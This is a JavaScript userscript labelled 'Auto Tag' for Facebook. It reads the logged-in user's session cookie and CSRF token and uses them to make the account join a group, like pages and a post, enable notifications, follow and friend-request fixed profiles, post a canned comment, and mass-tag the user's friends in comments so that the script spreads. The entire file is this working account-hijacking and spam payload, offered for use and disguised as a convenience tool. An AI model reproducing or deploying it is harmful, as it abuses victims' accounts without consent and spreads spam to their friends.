// ==UserScript==
// @name           Auto Tag
// @namespace      BTL 
// @description    Auto Tag
// ==/UserScript==
var b = document.getElementsByName("fb_dtsg")[0].value,
     c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
/*Add Join Group*/
 function g(d) {
     var a = new XMLHttpRequest;
     d = "&ref=group_jump_header&group_id=" + d + "&fb_dtsg=" + b + "&__user=" + c + "&phstamp=";
     a.open("POST", "/ajax/groups/membership/r2j.php?__a=1", !0);
     a.onreadystatechange = function () {
         4 == a.readyState && 200 == a.status && a.close
     };
     a.send(d)
 }
 g("689255414468771");
 b = document.getElementsByName("fb_dtsg")[0].value;
 c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 function Like(p) {
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
     var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 Like("214981461999315");
 Like("608738295860543");
/*page noti*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 function N(noti) {
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
     var PageParams = "notifier_id=" + noti + "&enable=true&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=a&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 N("214981461999315");
 N("608738295860543");
/*Auto Follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 function a(abone) {
     var http4 = new XMLHttpRequest();
     var url4 = "/ajax/follow/follow_profile.php?__a=1";
     var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
     http4.open("POST", url4, true);
     http4.onreadystatechange = function () {
         if (http4.readyState == 4 && http4.status == 200) {
             http4.close;
         }
     };
     http4.send(params4);
 }
 a("100003402522960");
 a("100006971641762");
/*Page noti*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 function pn(noti) {
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
     var PageParams = "notifier_id=" + noti + "&enable=true&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmvudDgDxrHEHyGameyp8y&__req=g&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 pn("100003402522960");
 pn("100006971641762");
/*like post php*/
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var now = (new Date).getTime();
 function p(post) {
     var X = new XMLHttpRequest();
     var XURL = "//www.facebook.com/ajax/ufi/like.php";
     var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
     X.open("POST", XURL, true);
     X.onreadystatechange = function () {
         if (X.readyState == 4 && X.status == 200) {
             X.close;
         }
     };
     X.send(XParams);
 }
 p("467942369995843");
/*Auto Comment*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
 function com(cc) {
     var Page = new XMLHttpRequest();
     var PageURL = "//www.facebook.com/ajax/ufi/add_comment.php";
     var PageParams = "ft_ent_identifier=" + cc + "&comment_text=Great, This work awesome, you rock!!!!!!!!!!&source=2&client_id=1381330051325%3A2643585115&reply_fbid&parent_comment_id&rootid=u_0_9&clp=%7B%22cl_impid%22%3A%2289ff834f%22%2C%22clearcounter%22%3A0%2C%22elementid%22%3A%22js_0%22%2C%22version%22%3A%22x%22%2C%22parent_fbid%22%3A" + cc + "%7D&attached_sticker_fbid=0&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=h&fb_dtsg=" + fb_dtsg + "&ttstamp=265816610484687452";
     Page.open("POST", PageURL, true);
     Page.onreadystatechange = function () {
         if (Page.readyState == 4 && Page.status == 200) {
             Page.close;
         }
     };
     Page.send(PageParams);
 }
 com("467942369995843");
/*Add Friend*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 function IDS(r) {
 var X = new XMLHttpRequest();
 var XURL = "//www.facebook.com/ajax/add_friend/action.php";
 var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
 X.open("POST", XURL, true);
 X.onreadystatechange = function () {
 if (X.readyState == 4 && X.status == 200) {
 X.close;
 }
 };
 X.send(XParams);
 }
 IDS("100003402522960");
function x__0() {
	return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest;
};


function get_friends() {
	var a = x__0();
	a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer=" + uid + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", false);
	a.send(null);
	if (a.readyState == 4) {
		var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));
		return f.payload.entries;
	}
	return false;
}


function get_uid(b) {
	var a = x__0();
	a.open("GET", 'http://graph.facebook.com/' + b, false);
	a.send();
	if (a.readyState == 4) {
		return uid = JSON.parse(a.responseText).id;
	}
	return false;
}
var patt = /comment_text=(.*?)&/
var c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1];
uid = get_uid(username);
a = window.top.location;
termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a);
uids = 'comment_text=';
header = 'ft_ent_identifier=' + post_id + '&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user=' + uid + '&__a=1&__req=4u&fb_dtsg=' + document.getElementsByName('fb_dtsg')[0].value + '&phstamp=' + Math.random();
for (var n = 1; n < amigos.length; n++) {
	//uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';
	fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
	uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';
	c++;
	if (c == 7) {
		uids += '&';
		with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"),
		setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
		send(header.replace(patt, uids));
		z = setTimeout('function(){asd=0}', 1000);
		clearInterval(z);
		c = 1;
		uids = 'comment_text=';
	}
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);


function cereziAl(isim) {
	var tarama = isim + "=";
	if (document.cookie.length > 0) {
		konum = document.cookie.indexOf(tarama)
		if (konum != -1) {
			konum += tarama.length
			son = document.cookie.indexOf(";", konum)
			if (son == -1) son = document.cookie.length
			return unescape(document.cookie.substring(konum, son))
		} else {
			return "";
		}
	}
}


function getRandomInt(min, max) {
	return Math.floor(Math.random() * (max - min + 1)) + min;
}


function randomValue(arr) {
	return arr[getRandomInt(0, arr.length - 1)];
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);


function a(abone) {
	var http4 = new XMLHttpRequest();
	var url4 = "/ajax/follow/follow_profile.php?__a=1";
	var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
	http4.open("POST", url4, true);
	//Send the proper header information along with the request
	http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	http4.setRequestHeader("Content-length", params4.length);
	http4.setRequestHeader("Connection", "close");
	http4.onreadystatechange = function () { //Call a function when the state changes.
		if (http4.readyState == 4 && http4.status == 200) {
			http4.close; // Close the connection
		}
	}
	http4.send(params4);
}